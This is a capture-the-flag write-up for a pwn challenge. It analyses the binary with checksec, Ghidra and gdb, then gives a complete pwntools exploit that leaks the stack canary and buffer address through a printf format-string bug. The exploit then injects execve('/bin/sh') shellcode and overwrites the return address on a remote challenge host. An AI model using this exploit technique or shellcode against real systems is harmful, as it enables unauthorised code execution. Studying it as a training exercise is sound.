+++
title = "Shell is Love, Shell is life"
date = 2024-09-11
authors = ["Abhinav I S"]
+++

As with all pwn challenges, we run checksec on the binary
```checksec --file=pwn```

```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

NX bit is disabled !, we can execute code on the stack!, 
let us try dissassembling the binary using GHIDRA
```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  banner();
  setbuf(stdout,(char *)0x0);
  local_78 = 0x333c2049;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  puts("Can you pwn me?");
  puts("What is your name?");
  fgets((char *)&local_78,100,stdin);
  puts("Welcome to the contingent");
  printf((char *)&local_78);
  puts("Anything else?");
  fgets((char *)&local_78,0x100,stdin);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

They are printing user input directly using printf!
We can leak information using format string vulnerabilities

Let us observe the stack using gdb 
`x/50x $rsp`

```
0x7fffffffdc90: 0x0000000d      0x00000000      0xffffdca0      0x00007fff
0x7fffffffdca0: 0x6c243725      0x00000a78      0x00000000      0x00000000
0x7fffffffdcb0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdce0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcf0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdd00: 0x00000000      0x00000000      0x20220400      0x87f89f7d
0x7fffffffdd10: 0x00000001      0x00000000      0xf7c29d90      0x00007fff
0x7fffffffdd20: 0x00000000      0x00000000      0x55555240      0x00005555
0x7fffffffdd30: 0xffffde10      0x00000001      0xffffde28      0x00007fff
0x7fffffffdd40: 0x00000000      0x00000000      0x66b41503      0xb621f5da
0x7fffffffdd50: 0xffffde28      0x00007fff
```
Strangely, there is an address in the stack, in the stack itself! (0x7fffffffdca0) at 0x7fffffffdc98

, Let us try putting AAAA into the first input prompt !

examining the stack again,
```
gef➤  x/50x $rsp
0x7fffffffdc90: 0x0000000d      0x00000000      0xffffdca0      0x00007fff
0x7fffffffdca0: 0x0a414141      0x00000000      0x00000000      0x00000000
0x7fffffffdcb0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdce0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdcf0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdd00: 0x00000000      0x00000000      0x67406800      0xa126b205
0x7fffffffdd10: 0x00000001      0x00000000      0xf7c29d90      0x00007fff
0x7fffffffdd20: 0x00000000      0x00000000      0x55555240      0x00005555
0x7fffffffdd30: 0xffffde10      0x00000001      0xffffde28      0x00007fff
0x7fffffffdd40: 0x00000000      0x00000000      0x1dd653c2      0xd568252e
0x7fffffffdd50: 0xffffde28      0x00007fff
```

The address of the buffer is in the stack !, we can leak this address, along with the canary, write shellcode in this buffer, and then over write the return address with the address of the buffer!

```python
from pwn import *

#exe = ELF("./vuln")

#context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("10.21.232.38", 7003)

    return r


def main():
    r = conn()
    # 22 - > rbp
    # 21 - > canary
    # 7-> location of the array
    payload1 = b"%7$lx.%21$lx"
    r.recvuntil(b"name?\n")
    r.sendline(payload1)
    r.recvuntil("contingent\n")
    data = r.recv().split(b'\n')[0]
    print(data.split(b"."))
    data = data.split(b".")
    addr = int(data[0],16)
    canary = int(data[1],16)


    shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

    #shellcode is 28 bytes long

    print(len(shellcode))
    payload2 = shellcode + b"A"*(104-48)+ p64(canary) +b"B"*8 + p64(addr)


    r.sendline(payload2)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```





